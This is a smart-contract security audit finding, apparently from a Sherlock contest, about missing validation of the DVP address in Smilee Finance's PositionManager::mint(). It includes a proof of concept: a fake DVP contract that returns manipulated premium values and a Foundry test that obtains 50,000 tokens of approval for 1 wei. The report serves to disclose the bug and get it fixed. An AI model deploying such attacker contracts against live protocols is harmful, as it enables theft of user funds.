Low Mauve Crab

medium

# Users can approve unlimited amounts of baseToken (and any other token), and also can mint incorrect PositionManager NFTs, by providing an arbitrary DVP address

## Summary
There is no input validation for the DVP address provided to `PositionManager::mint()`. A user can provide a malicious contract address, allowing them to gain large amounts of permanent baseToken approval from the PositionManager, and also mint PositionManager NFTs which contain incorrect information.

## Vulnerability Detail
In `PositionManager::mint()`, the DVP contract used is obtained via:

```solidity
IDVP dvp = IDVP(params.dvpAddr);
```

Then, it transfers `obtainedPremium` from the caller to itself:
```solidity
baseToken.safeTransferFrom(msg.sender, address(this), obtainedPremium);
```

Then later on, the PositionManager gives baseToken approval to this contract:
```solidity
baseToken.safeApprove(params.dvpAddr, obtainedPremium);
```

After that, it refunds the user:
```solidity
if (obtainedPremium > premium) {
    baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);
} 
```
Note that the values of `obtainedPremium` and `premium` are obtained from the DVP which is arbitrarily provided by the attacker, so they can manipulate these values as they wish.

In the end, they mint a new PositionManager NFT, gain approval to baseTokens from the PositionManager, and all the funds used would be refunded within the same transaction.

However this issue is blocked by another issue (submitted in another report): the fact that the refund will always revert since it uses `safeTransferFrom` which requires approvals, but the PM never gave approvals to itself. But when that issue is fixed, (by changing `safeTransferFrom` to `safeTransfer`), the refunds will work, enabling this exploit.

## Impact
A malicious user can gain large amounts of permanent baseToken approval from the PositionManager, and also mint PositionManager NFTs which contain incorrect information. This means that they can set up a bot that steals any baseToken (or any other token they choose) that ends up in the PositionManager's possession.

## Code Snippet
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/periphery/PositionManager.sol#L94

## Proof of Concept
<details>
<summary>Fake DVP Contract provided by attacker</summary>

```solidity
contract FakeDVP {
    address private immutable bt;
    constructor(address _bt) {
        bt= _bt;
    }

    function baseToken() external view returns(address) {
        return bt; // the baseToken
    }

    function mint(address a, uint256 s, uint256 nu, uint256 nd, uint256 ep, uint256 ms, uint256 id) external pure returns(uint256) {
        return 1; // this is the 'premium' from minting
    }

    function premium(uint256 a, uint256 b, uint256 c) external pure returns (uint256, uint256) {
        return (50000e6, 0); // this returns the value for 'obtainedPremium'
    }

    function getEpoch() external view returns(Epoch memory) {
        uint256 z = 1;
        return Epoch(z,z,z,z,z); // just returns an arbitrary epoch
    }
}
```
</details>

<details>
<summary>Foundry Test POC</summary>

```solidity
function test_PM_UnlimitedApproval() public {

        address attacker = makeAddr("attacker");
        FakeDVP fake = new FakeDVP(baseToken);
        deal(baseToken, attacker, 50000e6);

        //NOTE: the below line is added to simulate the fix of another separate critical issue submitted in this audit
        vm.prank(address(pm));
        IERC20(baseToken).approve(address(pm), type(uint256).max); 

        uint256 allowanceBefore = IERC20(baseToken).allowance(address(pm), address(fake));
        console.log(allowanceBefore);
        vm.startPrank(attacker);
        IERC20(baseToken).approve(address(pm), 50000e6);
        (uint256 tokenId, ) = pm.mint(
            IPositionManager.MintParams({
                dvpAddr: address(fake),
                notionalUp: 10 ether,
                notionalDown: 0,
                strike: 55,
                recipient: DEFAULT_SENDER,
                tokenId: 0,
                expectedPremium: 55,
                maxSlippage: 0.1e18,
                nftAccessTokenId: 0
            })
        );
        vm.stopPrank();

        uint256 allowanceAfter = IERC20(baseToken).allowance(address(pm), address(fake));
        
        assertEq(allowanceAfter, 50000e6);

        // attacker spent 1 wei, to get 50k worth of approvals
        assertEq(IERC20(baseToken).balanceOf(address(attacker)), 50000e6 - 1);
    }
```
</details>

## Tool used

Manual Review

## Recommendation
Maintain a mapping in the PositionManager (address to boolean) which stores active DVP addresses. Then revert if the DVP address provided maps to a false boolean.
